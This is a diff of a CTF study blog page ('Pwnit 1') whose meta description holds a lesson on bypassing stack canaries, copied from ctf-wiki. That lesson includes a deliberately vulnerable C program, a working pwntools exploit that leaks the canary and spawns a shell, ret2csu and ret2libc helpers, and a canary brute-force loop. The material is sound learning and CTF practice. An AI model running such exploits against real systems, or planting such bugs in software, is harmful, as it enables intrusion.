@@ -20,26 +20,26 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="My way, though far away">
 <meta property="og:title" content="Pwnit 1">
-<meta property="og:url" content="https://zjgcjy.github.io/posts/2019-03/Pwnit-1.html">
+<meta property="og:url" content="http://localhost:4000/posts/2019-03/Pwnit-1.html">
 
 
   <meta property="og:description" content="  pwn学习资料，来自ctf-wiki。安全机制-CanaryCanarycanary 不管是实现还是设计思想都比较简单高效，就是插入一个值，在 stack overflow 发生的 高危区域的尾部，当函数返回之时检测 canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。原理：-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护-fstack-protector-all 启用保护，为所有函数插入保护-fstack-protector-strong-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护-fno-stack-protector 禁用保护.Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配。当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：mov    rax, qword ptr fs:[0x28]mov    qword ptr [rbp - 8], rax在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。mov    rdx,QWORD PTR [rbp-0x8]xor    rdx,QWORD PTR fs:0x28je     0x4005d7 &lt;main+65&gt;call   0x400460 &lt;__stack_chk_fail@plt&gt;如果 canary 已经被非法修改，此时程序流程会走到 __stack_chk_fail。__stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，glibc2.28中定义如下。这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。事实上，TLS 中的值由函数 security_init 进行初始化。Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。demo源代码如下：#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void getshell(void) {    system(&quot;/bin/sh&quot;);}void init() {    setbuf(stdin, NULL);    setbuf(stdout, NULL);    setbuf(stderr, NULL);}void vuln() {    char buf[100];    for(int i=0;i&lt;2;i++){        read(0, buf, 0x200);        printf(buf);    }}int main(void) {    init();    puts(&quot;Hello Hacker!&quot;);    vuln();    return 0;}编译为 32bit 程序，开启 NX，ASLR，Canary 保护。makefile文件如下。CC = gccSRCS = canary.cEXEC = $(SRCS:.c=)X86 = -m32X64 = DEBUG = -g# ------------- security ----------------NO_CANARY = -fno-stack-protectorCANARY = -fstack-protectorALL_CANARY = -fstack-protector-allNO_NX = -z execstackNX = -z noexecstackNO_PIE = -no-piePIE = -fpie -pieALL_PIE = -fPIE -pieNO_RELRO = -z norelroPART_RELRO = -z lazyALL_RELRO = -z now# ------------- security ----------------# X86 DEBUG NO_CANARY NO_NX NO_PIE PART_RELROALL_NO = $(X86) $(DEBUG) $(NO_CANARY) $(NO_NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG NO_CANARY NX NO_PIE PART_RELROONLY_NX = $(X86) $(DEBUG) $(NO_CANARY) $(NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG CANARY NX NO_PIE PART_RELROCANARY_NX = $(X86) $(DEBUG) $(CANARY) $(NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG CANARY NX PIE PART_RELROCANARY_NX_PIE = $(X86) $(DEBUG) $(CANARY) $(NX) $(PIE) $(PART_RELRO)CFLAGS = $(CANARY_NX)${EXEC}:	$(CC) $(CFLAGS) $(SRCS) -o $(EXEC)all:	${EXEC}clean:	rm $(EXEC)首先通过覆盖 Canary 最后一个 \x00 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中。#!/usr/bin/env python# -*- coding: utf-8 -*-__author__=&#39;zjgcjy&#39;import osimport sysfrom pwn import *#from LibcSearcher import *usage = &#39;&#39;&#39;	usage: python2 exp.py file index &#39;&#39;&#39;if len(sys.argv) != 3:	print usage	exit(-1)vul = &#39;./&#39; + sys.argv[1]elf = ELF(vul)context.arch = elf.archcontext.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]index = eval(sys.argv[2])if index == 0:	context.log_level = &#39;debug&#39;	libc = elf.libc	s = process(vul)elif index == 1:    context.log_level = &#39;debug&#39;    libc = elf.libc    s = gdb.debug(vul, &#39;&#39;&#39;break _startcontinueb main&#39;&#39;&#39;)    pause()elif index == 2:	context.log_level = &#39;debug&#39;	libc = elf.libc	s = process(vul)	#gdb.attach(proc.pidof(s)[0])	gdb.attach(s, &quot;b main&quot;)	pause()elif index == 3:	context.log_level = &#39;debug&#39;	lib = &#39;~/work/ctf/2019/tamuctf/pwn/3/libc.so.6&#39;	libc = ELF(lib)	s = process(vul, env={&#39;LD_PRELOAD&#39;: lib})		gdb.attach(s, &quot;b * 0x40080b&quot;)	pause()elif index == 4:	context.log_level = &#39;debug&#39;	ip = &#39;pwn.jarvisoj.com&#39; 	port = 1234	s = remote(ip, port)    else:	print &#39;wrong&#39;def libSearch(addr, fname = &#39;write&#39;):	obj = LibcSearcher(fname, addr)	#obj.db = &#39;libc6_2.23-0ubuntu10_i386.symbols&#39;	libc_base = addr - obj.dump(fname)	system_addr = libc_base + obj.dump(&#39;system&#39;)	binsh_addr = libc_base + obj.dump(&#39;str_bin_sh&#39;)	execve_addr = libc_base + obj.dump(&#39;execve&#39;)	log.success(&quot;libc_base -&gt; {:#x}&quot;.format(libc_base))&#39;&#39;&#39;d = DynELF(leak, elf = ELF(argv[1]))system_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)success(&quot;system_addr -&gt; {:#x}&quot;.format(system_addr))&#39;&#39;&#39;def leak(address, ret, offset, length = 4):    payload = &#39;a&#39; * offset + p32(elf.plt[&#39;write&#39;]) + p32(ret)     payload += p32(1) + p32(address) + p32(length)    s.send(payload)    data = s.recv(length)    log.info(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return datadef csu(offset, r12, r15, r14, r13, ret, rbx = 0, rbp = 1):    # pop rbx,rbp,r12,r13,r14,r15    # rbx = 0,    # rbp = 1    # call r12    # rdi = edi = r15d    # rsi = r14    # rdx = r13    payload = &#39;a&#39; * offset + p64(csu_second_addr)    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)    payload += p64(csu_first_addr)    payload += &#39;a&#39; * 0x38    payload += p64(ret)    s.send(payload)    sleep(0.5)def csu_make():	csu_first_addr = 0x4005F0	csu_second_addr = 0x40060A	main_addr = 0x40057D	s.recv()	# write(1,got[&#39;write&#39;],8)	csu(136, elf.got[&#39;write&#39;], 1, elf.got[&#39;write&#39;], 8, main_addr)	libc.address = u64(s.recv(8)) - libc.symbols[&#39;write&#39;]	log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))	s.recv()	# read(0,bss,16)	# read execve_addr and /bin/sh\x00	csu(136, elf.got[&#39;read&#39;], 0, elf.bss(), 16, main_addr)	s.send(p64(libc.symbols[&#39;execve&#39;]) + &#39;/bin/sh\x00&#39;)	s.recv()	# execve(&#39;/bin/sh&#39;, 0, 0)	csu(136, elf.bss(), elf.bss()+8, 0, 0, 0xdeadbeef)	s.interactive()def exception_canary():	environ_addr = libc.symbols[&#39;environ&#39;]	payload = flat([cyclic(0x128), environ_addr])	stack_address = u64(s.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;))	success(&quot;stack_address -&gt; {:#x}&quot;.format(stack_address))	payload = flat([cyclic(0x128), stack_address - 0x168])	payload = flat([&#39;1&#39;*8, rdi_ret, elf.got[&#39;setvbuf&#39;], elf.plt[&#39;puts&#39;], vuln_addr]).ljust(80, &#39;a&#39;)	payload += flat([fake_rbp, leave_ret_addr])	libc.address = u64(s.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;)) - libc.symbols[&#39;setvbuf&#39;]	rdx_rsi_ret = libc.address + 0x1150c9	sh_addr = next(libc.search(&quot;/bin/sh&quot;))	execve_addr = libc.sym[&#39;execve&#39;]	payload = flat([&#39;2&#39; *8, rdi_ret, sh_addr, rdx_rsi_ret, 0, 0, execve_addr]).ljust(80,&#39;b&#39;)	payload += flat([fake_rbp - 0x30, leave_ret_addr])def main():	s.recv()	s.sendline(cyclic(100))	s.recvuntil(&quot;\x0a&quot;)	canary = u32(s.recv(3).rjust(4, &#39;\x00&#39;))	log.success(&quot;canary -&gt; {:#x}&quot;.format(canary))		getshell = elf.sym[&quot;getshell&quot;]		s.sendline(cyclic(100) + p32(canary) + &#39;a&#39;*12 + p32(getshell))	s.recv()	s.interactive()	if __name__==&#39;__main__&#39;:	main()	爆破canaryone-by-one对于 Canary，不仅每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，而且同一个进程中的每个线程的 Canary 也不同。 但是存在一类通过 fork 函数开启子进程交互的题目，因为 fork 函数会直接拷贝父进程的内存，因此每次创建的子进程的 Canary 是相同的。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary:print &quot;[+] Brute forcing stack canary &quot;start = len(p)stop = len(p)+8while len(p) &lt; stop:   for i in xrange(0,256):      res = send2server(p + chr(i))      if res != &quot;&quot;:         p = p + chr(i)         #print &quot;\t[+] Byte found 0x%02x&quot; % i         break      if i == 255:         print &quot;[-] Exploit failed&quot;         sys.exit(-1)canary = p[stop:start-1:-1].encode(&quot;hex&quot;)print &quot;   [+] SSP value is 0x%s&quot; % canary劫持__stack_chk_fail 函数已知 Canary 失败的处理逻辑会进入到 __stack_chk_failed 函数，__stack_chk_failed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。覆盖 TLS 中储存的 Canary 值已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。">
 
 
 
-  <meta property="og:image" content="https://zjgcjy.github.io/assets/images/bio-photo.jpg">
+  <meta property="og:image" content="http://localhost:4000/assets/images/bio-photo.jpg">
 
 
 
   <meta name="twitter:site" content="@zjgcjy">
   <meta name="twitter:title" content="Pwnit 1">
   <meta name="twitter:description" content="  pwn学习资料，来自ctf-wiki。安全机制-CanaryCanarycanary 不管是实现还是设计思想都比较简单高效，就是插入一个值，在 stack overflow 发生的 高危区域的尾部，当函数返回之时检测 canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。原理：-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护-fstack-protector-all 启用保护，为所有函数插入保护-fstack-protector-strong-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护-fno-stack-protector 禁用保护.Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配。当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：mov    rax, qword ptr fs:[0x28]mov    qword ptr [rbp - 8], rax在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。mov    rdx,QWORD PTR [rbp-0x8]xor    rdx,QWORD PTR fs:0x28je     0x4005d7 &lt;main+65&gt;call   0x400460 &lt;__stack_chk_fail@plt&gt;如果 canary 已经被非法修改，此时程序流程会走到 __stack_chk_fail。__stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，glibc2.28中定义如下。这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。事实上，TLS 中的值由函数 security_init 进行初始化。Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。demo源代码如下：#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void getshell(void) {    system(&quot;/bin/sh&quot;);}void init() {    setbuf(stdin, NULL);    setbuf(stdout, NULL);    setbuf(stderr, NULL);}void vuln() {    char buf[100];    for(int i=0;i&lt;2;i++){        read(0, buf, 0x200);        printf(buf);    }}int main(void) {    init();    puts(&quot;Hello Hacker!&quot;);    vuln();    return 0;}编译为 32bit 程序，开启 NX，ASLR，Canary 保护。makefile文件如下。CC = gccSRCS = canary.cEXEC = $(SRCS:.c=)X86 = -m32X64 = DEBUG = -g# ------------- security ----------------NO_CANARY = -fno-stack-protectorCANARY = -fstack-protectorALL_CANARY = -fstack-protector-allNO_NX = -z execstackNX = -z noexecstackNO_PIE = -no-piePIE = -fpie -pieALL_PIE = -fPIE -pieNO_RELRO = -z norelroPART_RELRO = -z lazyALL_RELRO = -z now# ------------- security ----------------# X86 DEBUG NO_CANARY NO_NX NO_PIE PART_RELROALL_NO = $(X86) $(DEBUG) $(NO_CANARY) $(NO_NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG NO_CANARY NX NO_PIE PART_RELROONLY_NX = $(X86) $(DEBUG) $(NO_CANARY) $(NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG CANARY NX NO_PIE PART_RELROCANARY_NX = $(X86) $(DEBUG) $(CANARY) $(NX) $(NO_PIE) $(PART_RELRO)# X86 DEBUG CANARY NX PIE PART_RELROCANARY_NX_PIE = $(X86) $(DEBUG) $(CANARY) $(NX) $(PIE) $(PART_RELRO)CFLAGS = $(CANARY_NX)${EXEC}:	$(CC) $(CFLAGS) $(SRCS) -o $(EXEC)all:	${EXEC}clean:	rm $(EXEC)首先通过覆盖 Canary 最后一个 \x00 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中。#!/usr/bin/env python# -*- coding: utf-8 -*-__author__=&#39;zjgcjy&#39;import osimport sysfrom pwn import *#from LibcSearcher import *usage = &#39;&#39;&#39;	usage: python2 exp.py file index &#39;&#39;&#39;if len(sys.argv) != 3:	print usage	exit(-1)vul = &#39;./&#39; + sys.argv[1]elf = ELF(vul)context.arch = elf.archcontext.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]index = eval(sys.argv[2])if index == 0:	context.log_level = &#39;debug&#39;	libc = elf.libc	s = process(vul)elif index == 1:    context.log_level = &#39;debug&#39;    libc = elf.libc    s = gdb.debug(vul, &#39;&#39;&#39;break _startcontinueb main&#39;&#39;&#39;)    pause()elif index == 2:	context.log_level = &#39;debug&#39;	libc = elf.libc	s = process(vul)	#gdb.attach(proc.pidof(s)[0])	gdb.attach(s, &quot;b main&quot;)	pause()elif index == 3:	context.log_level = &#39;debug&#39;	lib = &#39;~/work/ctf/2019/tamuctf/pwn/3/libc.so.6&#39;	libc = ELF(lib)	s = process(vul, env={&#39;LD_PRELOAD&#39;: lib})		gdb.attach(s, &quot;b * 0x40080b&quot;)	pause()elif index == 4:	context.log_level = &#39;debug&#39;	ip = &#39;pwn.jarvisoj.com&#39; 	port = 1234	s = remote(ip, port)    else:	print &#39;wrong&#39;def libSearch(addr, fname = &#39;write&#39;):	obj = LibcSearcher(fname, addr)	#obj.db = &#39;libc6_2.23-0ubuntu10_i386.symbols&#39;	libc_base = addr - obj.dump(fname)	system_addr = libc_base + obj.dump(&#39;system&#39;)	binsh_addr = libc_base + obj.dump(&#39;str_bin_sh&#39;)	execve_addr = libc_base + obj.dump(&#39;execve&#39;)	log.success(&quot;libc_base -&gt; {:#x}&quot;.format(libc_base))&#39;&#39;&#39;d = DynELF(leak, elf = ELF(argv[1]))system_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)success(&quot;system_addr -&gt; {:#x}&quot;.format(system_addr))&#39;&#39;&#39;def leak(address, ret, offset, length = 4):    payload = &#39;a&#39; * offset + p32(elf.plt[&#39;write&#39;]) + p32(ret)     payload += p32(1) + p32(address) + p32(length)    s.send(payload)    data = s.recv(length)    log.info(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return datadef csu(offset, r12, r15, r14, r13, ret, rbx = 0, rbp = 1):    # pop rbx,rbp,r12,r13,r14,r15    # rbx = 0,    # rbp = 1    # call r12    # rdi = edi = r15d    # rsi = r14    # rdx = r13    payload = &#39;a&#39; * offset + p64(csu_second_addr)    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)    payload += p64(csu_first_addr)    payload += &#39;a&#39; * 0x38    payload += p64(ret)    s.send(payload)    sleep(0.5)def csu_make():	csu_first_addr = 0x4005F0	csu_second_addr = 0x40060A	main_addr = 0x40057D	s.recv()	# write(1,got[&#39;write&#39;],8)	csu(136, elf.got[&#39;write&#39;], 1, elf.got[&#39;write&#39;], 8, main_addr)	libc.address = u64(s.recv(8)) - libc.symbols[&#39;write&#39;]	log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))	s.recv()	# read(0,bss,16)	# read execve_addr and /bin/sh\x00	csu(136, elf.got[&#39;read&#39;], 0, elf.bss(), 16, main_addr)	s.send(p64(libc.symbols[&#39;execve&#39;]) + &#39;/bin/sh\x00&#39;)	s.recv()	# execve(&#39;/bin/sh&#39;, 0, 0)	csu(136, elf.bss(), elf.bss()+8, 0, 0, 0xdeadbeef)	s.interactive()def exception_canary():	environ_addr = libc.symbols[&#39;environ&#39;]	payload = flat([cyclic(0x128), environ_addr])	stack_address = u64(s.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;))	success(&quot;stack_address -&gt; {:#x}&quot;.format(stack_address))	payload = flat([cyclic(0x128), stack_address - 0x168])	payload = flat([&#39;1&#39;*8, rdi_ret, elf.got[&#39;setvbuf&#39;], elf.plt[&#39;puts&#39;], vuln_addr]).ljust(80, &#39;a&#39;)	payload += flat([fake_rbp, leave_ret_addr])	libc.address = u64(s.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;)) - libc.symbols[&#39;setvbuf&#39;]	rdx_rsi_ret = libc.address + 0x1150c9	sh_addr = next(libc.search(&quot;/bin/sh&quot;))	execve_addr = libc.sym[&#39;execve&#39;]	payload = flat([&#39;2&#39; *8, rdi_ret, sh_addr, rdx_rsi_ret, 0, 0, execve_addr]).ljust(80,&#39;b&#39;)	payload += flat([fake_rbp - 0x30, leave_ret_addr])def main():	s.recv()	s.sendline(cyclic(100))	s.recvuntil(&quot;\x0a&quot;)	canary = u32(s.recv(3).rjust(4, &#39;\x00&#39;))	log.success(&quot;canary -&gt; {:#x}&quot;.format(canary))		getshell = elf.sym[&quot;getshell&quot;]		s.sendline(cyclic(100) + p32(canary) + &#39;a&#39;*12 + p32(getshell))	s.recv()	s.interactive()	if __name__==&#39;__main__&#39;:	main()	爆破canaryone-by-one对于 Canary，不仅每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，而且同一个进程中的每个线程的 Canary 也不同。 但是存在一类通过 fork 函数开启子进程交互的题目，因为 fork 函数会直接拷贝父进程的内存，因此每次创建的子进程的 Canary 是相同的。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary:print &quot;[+] Brute forcing stack canary &quot;start = len(p)stop = len(p)+8while len(p) &lt; stop:   for i in xrange(0,256):      res = send2server(p + chr(i))      if res != &quot;&quot;:         p = p + chr(i)         #print &quot;\t[+] Byte found 0x%02x&quot; % i         break      if i == 255:         print &quot;[-] Exploit failed&quot;         sys.exit(-1)canary = p[stop:start-1:-1].encode(&quot;hex&quot;)print &quot;   [+] SSP value is 0x%s&quot; % canary劫持__stack_chk_fail 函数已知 Canary 失败的处理逻辑会进入到 __stack_chk_failed 函数，__stack_chk_failed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。覆盖 TLS 中储存的 Canary 值已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。">
-  <meta name="twitter:url" content="https://zjgcjy.github.io/posts/2019-03/Pwnit-1.html">
+  <meta name="twitter:url" content="http://localhost:4000/posts/2019-03/Pwnit-1.html">
 
   
     <meta name="twitter:card" content="summary">
     
-      <meta name="twitter:image" content="https://zjgcjy.github.io/assets/images/bio-photo.jpg">
+      <meta name="twitter:image" content="http://localhost:4000/assets/images/bio-photo.jpg">
     
   
 
@@ -58,7 +58,7 @@
   
 
 
-<link rel="canonical" href="https://zjgcjy.github.io/posts/2019-03/Pwnit-1.html">
+<link rel="canonical" href="http://localhost:4000/posts/2019-03/Pwnit-1.html">
 
 
 
@@ -69,7 +69,7 @@
     
       "@type": "Person",
       "name": "Blogger",
-      "url": "https://zjgcjy.github.io/",
+      "url": "http://localhost:4000/",
       "sameAs": ["https://twitter.com/","https://github.com/"]
     
   }
@@ -193,7 +193,7 @@
     
       
         <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-          <a href="https://zjgcjy.github.io/" itemprop="item"><span itemprop="name">Home</span></a>
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
           <meta itemprop="position" content="1" />
         </li>
         <span class="sep">/</span>
@@ -263,26 +263,26 @@
     <ul class="author__urls social-icons">
       
         <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
-          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">BeiJing China</span>
+          <i class="fa fa-map-marker" aria-hidden="true"></i> <span itemprop="name">BeiJing China</span>
         </li>
       
 
       
         
           
-            <li><a href="https://zjgcjy.github.io" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i> Website</a></li>
+            <li><a href="https://zjgcjy.github.io" rel="nofollow noopener noreferrer"><i class="fa fa-link" aria-hidden="true"></i> Website</a></li>
           
         
           
-            <li><a href="mailto:zjgcjy@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email</a></li>
+            <li><a href="mailto:zjgcjy@gmail.com" rel="nofollow noopener noreferrer"><i class="fa fa-envelope-square" aria-hidden="true"></i> Email</a></li>
           
         
           
-            <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+            <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></li>
           
         
           
-            <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+            <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
           
         
       
@@ -754,7 +754,7 @@ success("system_addr -&gt; {:#x}".format(system_addr))
   
 
   <p class="page__taxonomy">
-    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <strong><i class="fa fa-tags" aria-hidden="true"></i> Tags: </strong>
     <span itemprop="keywords">
     
       
@@ -768,7 +768,7 @@ success("system_addr -&gt; {:#x}".format(system_addr))
 
 
         
-          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-03-01T03:49:00+08:00">March 01, 2019</time></p>
+          <p class="page__date"><strong><i class="fa fa-calendar" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-03-01T03:49:00+08:00">March 01, 2019</time></p>
         
       </footer>
 
@@ -777,11 +777,11 @@ success("system_addr -&gt; {:#x}".format(system_addr))
     <h4 class="page__share-title">Share on</h4>
   
 
-  <a href="https://twitter.com/intent/tweet?via=zjgcjy&text=Pwnit+1%20https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2019-03%2FPwnit-1.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?via=zjgcjy&text=Pwnit+1%20http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2019-03%2FPwnit-1.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fa fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2019-03%2FPwnit-1.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2019-03%2FPwnit-1.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fa fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2019-03%2FPwnit-1.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2019-03%2FPwnit-1.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fa fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
@@ -1007,16 +1007,16 @@ pacman -S abc 从本地数据库中得到abc的信息，下载安装...</p>
     
       
         
-          <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></li>
         
       
         
-          <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
         
       
     
 
-    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    <li><a href="/feed.xml"><i class="fa fa-rss-square" aria-hidden="true"></i> Feed</a></li>
   </ul>
 </div>
 
@@ -1027,7 +1027,7 @@ pacman -S abc 从本地数据库中得到abc的信息，下载安装...</p>
 
     
   <script src="/assets/js/main.min.js"></script>
-  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+  <script src="https://use.fontawesome.com/1d25d6ba93.js"></script>
 
 
 
@@ -1042,7 +1042,7 @@ pacman -S abc 从本地数据库中得到abc的信息，下载安装...</p>
     
   <script>
     var disqus_config = function () {
-      this.page.url = "https://zjgcjy.github.io/posts/2019-03/Pwnit-1.html";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.url = "http://localhost:4000/posts/2019-03/Pwnit-1.html";  // Replace PAGE_URL with your page's canonical URL variable
       this.page.identifier = "/posts/2019-03/Pwnit-1"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
     (function() { // DON'T EDIT BELOW THIS LINE
